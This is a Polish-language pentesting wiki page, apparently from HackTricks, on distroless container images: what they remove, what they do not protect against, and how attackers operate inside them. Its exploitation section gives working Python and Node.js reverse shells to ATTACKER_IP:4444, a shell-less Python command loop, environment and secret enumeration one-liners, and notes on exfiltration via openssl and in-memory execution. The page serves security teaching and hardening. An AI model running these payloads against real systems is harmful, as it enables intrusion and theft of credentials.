# Kontenery distroless

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Obraz kontenera **distroless** to obraz, który dostarcza **minimalne komponenty runtime wymagane do uruchomienia jednej konkretnej aplikacji**, jednocześnie świadomie usuwając typowe narzędzia dystrybucyjne takie jak menedżery pakietów, powłoki i duże zestawy ogólnych narzędzi userland. W praktyce obrazy distroless często zawierają tylko binarkę aplikacji lub runtime, jej biblioteki współdzielone, pakiety certyfikatów i bardzo małą strukturę systemu plików.

Chodzi nie o to, że distroless jest nową prymitywną formą izolacji jądra. Distroless to **strategia projektowania obrazu**. Zmienia to, co jest dostępne **wewnątrz** systemu plików kontenera, a nie sposób, w jaki jądro izoluje kontener. Ta różnica ma znaczenie, ponieważ distroless wzmacnia środowisko głównie przez ograniczenie tego, czego atakujący może użyć po uzyskaniu wykonania kodu. Nie zastępuje to namespaces, seccomp, capabilities, AppArmor, SELinux ani żadnego innego mechanizmu izolacji w czasie wykonywania.

## Dlaczego distroless istnieje

Obrazy distroless są używane przede wszystkim w celu zmniejszenia:

- rozmiaru obrazu
- złożoności operacyjnej obrazu
- liczby pakietów i plików binarnych, które mogą zawierać luki bezpieczeństwa
- liczby domyślnie dostępnych dla atakującego narzędzi post-exploitation

Dlatego obrazy distroless są popularne w produkcyjnych wdrożeniach aplikacji. Kontener, który nie zawiera powłoki, menedżera pakietów i niemal żadnych ogólnych narzędzi, zwykle jest łatwiejszy do zrozumienia z operacyjnego punktu widzenia i trudniejszy do interaktywnego nadużycia po kompromitacji.

Przykłady znanych rodzin obrazów w stylu distroless to:

- Google's distroless images
- Chainguard hardened/minimal images

## Co distroless nie oznacza

Obraz distroless **nie jest**:

- automatycznie rootless
- automatycznie non-privileged
- automatycznie tylko do odczytu
- automatycznie chroniony przez seccomp, AppArmor lub SELinux
- automatycznie bezpieczny przed container escape

Nadal można uruchomić obraz distroless z `--privileged`, z współdzieleniem namespaces hosta, niebezpiecznymi bind mountami lub zamontowanym socketem runtime. W takim scenariuszu obraz może być minimalny, ale kontener wciąż może być katastrofalnie niebezpieczny. Distroless zmienia **powierzchnię ataku userland**, a nie **granice zaufania jądra**.

## Typowe cechy operacyjne

Gdy przejmuje się kontrolę nad kontenerem distroless, pierwszą rzeczą, którą zwykle zauważasz, jest to, że powszechne założenia przestają być prawdziwe. Może nie być `sh`, nie być `bash`, nie być `ls`, nie być `id`, nie być `cat`, a czasem nawet brakować środowiska opartego na libc, które zachowuje się tak, jak oczekuje twój zwykły warsztat. To wpływa zarówno na ofensywę, jak i obronę, ponieważ brak narzędzi zmienia debugowanie, incident response i post-exploitation.

Najczęstsze wzorce to:

- runtime aplikacji istnieje, ale niewiele więcej
- payloady oparte na powłoce zawodzą, ponieważ brak jest powłoki
- powszechne jedno-linijkowe narzędzia do enumeracji zawodzą, bo brak jest pomocniczych binarek
- zabezpieczenia systemu plików, takie jak rootfs tylko do odczytu lub `noexec` na zapisywalnych tmpfs, często też występują

To połączenie zwykle prowadzi ludzi do rozmów o "weaponizing distroless".

## Distroless i post-exploitation

Główne wyzwanie ofensywne w środowisku distroless to nie zawsze początkowe RCE. Często problemem jest to, co następuje później. Jeśli eksploatowany workload daje wykonanie kodu w runtime języka takiego jak Python, Node.js, Java czy Go, możesz być w stanie wykonać arbitralną logikę, ale nie przez normalne, oparte na powłoce workflowy, które są powszechne w innych celach Linuxowych.

To oznacza, że post-exploitation często przesuwa się w jednym z trzech kierunków:

1. **Użyj istniejącego runtime języka bezpośrednio**, aby zenumerować środowisko, otworzyć gniazda, odczytać pliki lub przygotować dodatkowe payloady.
2. **Załaduj własne narzędzia do pamięci** jeśli system plików jest tylko do odczytu lub zapisywalne miejsca są zamontowane z `noexec`.
3. **Wykorzystaj istniejące binarki obecne w obrazie**, jeśli aplikacja lub jej zależności zawierają coś niespodziewanie przydatnego.

## Wykorzystywanie

### Zbadaj dostępny runtime

W wielu kontenerach distroless nie ma powłoki, ale nadal istnieje runtime aplikacji. Jeśli celem jest usługa Python, Python tam jest. Jeśli celem jest Node.js, Node tam jest. To często daje wystarczającą funkcjonalność, aby enumerować pliki, odczytywać zmienne środowiskowe, otwierać reverse shells i przygotować wykonanie w pamięci bez wywoływania `/bin/sh`.

Prosty przykład z Pythonem:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Prosty przykład z Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Wpływ:

- odzyskanie zmiennych środowiskowych, często w tym poświadczeń lub punktów końcowych usług
- enumeracja systemu plików bez `/bin/ls`
- identyfikacja zapisywalnych ścieżek i zamontowanych sekretów

### Reverse Shell bez `/bin/sh`

Jeśli obraz nie zawiera `sh` ani `bash`, klasyczny reverse shell oparty na shelu może od razu nie działać. W takiej sytuacji użyj zainstalowanego środowiska uruchomieniowego języka zamiast tego.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Jeśli `/bin/sh` nie istnieje, zastąp ostatnią linię bezpośrednim wykonaniem poleceń sterowanym przez Python lub pętlą Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponownie — jeśli `/bin/sh` jest nieobecny, użyj bezpośrednio API Node'a do systemu plików, procesów i sieci zamiast uruchamiać powłokę.

### Pełny przykład: pętla poleceń Pythona bez powłoki

Jeśli obraz zawiera Pythona, ale nie ma w ogóle powłoki, prosta interaktywna pętla często wystarczy, żeby zachować pełne możliwości post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
To nie wymaga interaktywnego binarnego shell. Z perspektywy atakującego efekt jest de facto taki sam jak w przypadku podstawowego shell: command execution, enumeration oraz staging dalszych payloadów przez istniejący runtime.

### In-Memory Tool Execution

Distroless images są często łączone z:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Takie połączenie sprawia, że klasyczne workflowy "download binary to disk and run it" stają się zawodnymi. W takich przypadkach memory execution techniques stają się głównym rozwiązaniem.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Istniejące binaria już w obrazie

Niektóre distroless images wciąż zawierają operacyjnie niezbędne binaria, które stają się użyteczne po kompromisie. Często obserwowanym przykładem jest `openssl`, ponieważ aplikacje czasami go potrzebują do zadań związanych z crypto lub TLS.

Szybki wzorzec wyszukiwania to:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- nawiązywania wychodzących połączeń TLS
- data exfiltration przez dozwolony kanał egress
- staging payload data przez zakodowane/szyfrowane bloby

The exact abuse depends on what is actually installed, but the general idea is that distroless does not mean "no tools whatsoever"; it means "far fewer tools than a normal distribution image".

## Checks

Celem tych kontroli jest ustalenie, czy obraz w praktyce rzeczywiście jest distroless oraz które runtime lub helper binaries są nadal dostępne do post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Co jest tu interesujące:

- Jeśli nie ma shell, ale obecny jest runtime taki jak Python lub Node, post-exploitation powinno pivotować do runtime-driven execution.
- Jeśli root filesystem jest tylko do odczytu, a `/dev/shm` jest zapisywalny, ale `noexec`, techniki memory execution stają się znacznie istotniejsze.
- Jeśli pomocnicze binaria takie jak `openssl`, `busybox` lub `java` istnieją, mogą zaoferować wystarczającą funkcjonalność do bootstrapowania dalszego dostępu.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Kluczowe jest to, że distroless to **image property**, a nie ochrona na poziomie runtime. Jego wartość polega na ograniczeniu tego, co jest dostępne wewnątrz filesystem po kompromitacji.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
